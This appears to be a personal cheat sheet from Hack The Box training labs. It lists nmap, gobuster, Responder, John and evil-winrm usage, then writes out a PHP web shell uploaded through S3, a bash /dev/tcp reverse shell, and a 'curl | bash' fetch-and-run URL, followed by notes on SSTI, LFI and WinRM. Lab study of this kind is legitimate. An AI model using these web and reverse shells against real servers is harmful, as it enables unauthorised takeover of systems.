#nmap

```shell
-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.

-sV: Enables version detection, which will detect what versions are running on what
port.h

-p- : This flag scans for all TCP ports ranging from 0-65535

--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher
```

#gobuster

```shell
dir : Uses directory/file enumeration mode.
vhosts : Uses VHOST for brute-forcing.

--url : The target URL.
--wordlist : Path to the wordlist.
-x : File extension(s) to search for. (php/html)
```

# Responder:
```shell
sudo responder -I {network_interface} 
http://unika.htb/?page=//10.10.14.25/somefile
```

# John the riper:
```shell
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

#evil-winrm
```shell
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

#AWS
```shell
$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
                                                                                                            
$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2022-08-14 13:08:27 thetoppers.htb

$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2022-08-14 13:08:27          0 .htaccess
2022-08-14 13:08:27      11952 index.php

$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php              
                                                                                                            
```

# PHP
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
http://thetoppers.htb/shell.php?cmd=id
```

#REVERSE SHELL
Create shell.sh on local machine with the following content:
```shell
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```

start ncat listener on our local port and python http server on the same shell.sh directory:
```shell
nc -nvlp 1337
python3 -m http.server 8000
```
On web server open url http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.131:8000/shell.sh|bash

Reverse shell opened on nc terminal:
```shell
$ nc -nvlp 1337
Listening on 0.0.0.0 1337
ls
Connection received on 10.129.55.155 50192
bash: cannot set terminal process group (1612): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$
```

# XSS Cross site scripting

Cross Site Scripting [XSS](https://owasp.org/www-community/attacks/xss/) 

What is Node.js:
Node.js is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build
scalable network applications.

What is Express:
Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web
and mobile applications.

What is a Template Engine?
Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser).
For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
users with a static HTML page. The template engine would be used here, along a static "template" that
contains the basic structure of the profile page, which would then manually fill in the user information and
display it to the user.
Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
today is called Server Side Template Injection (SSTI).

What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
execution on the affected server.
This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
being used to reflect the email that the user inputs in the contact field


# INFO

WinRM, is a Windows-native built-in remote management protocol. port: 5985
NTLM: New Technology LAN Manager
LFI: Local File inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php 
RFI: Remote File Inclusion // File Inclusion Vulnerability // https://www.php.net/manual/en/function.include.php

S3: is a cloud-based object storage service. It allows us to store things in containers called buckets.
AWS S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery,
Static Website etc. The files stored in the Amazon S3 bucket are called S3 objects.
